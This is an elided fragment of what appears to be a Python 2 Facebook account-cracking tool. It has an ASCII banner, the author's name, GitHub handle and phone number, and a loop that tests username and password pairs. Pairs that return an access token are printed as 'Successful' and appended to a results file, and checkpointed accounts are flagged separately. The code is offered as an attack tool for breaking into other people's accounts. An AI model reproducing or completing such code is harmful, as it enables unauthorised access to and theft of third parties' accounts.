...
.##.....##.##.....##.##.....##.##.......##.....##....##...
  ...
  Auther  :  PRINCE ARAFT                              Github  :  PRINCE-ARAFAT
  Whapp   :  01943520447
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[*_*arafat Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('arafat/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[arafat(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
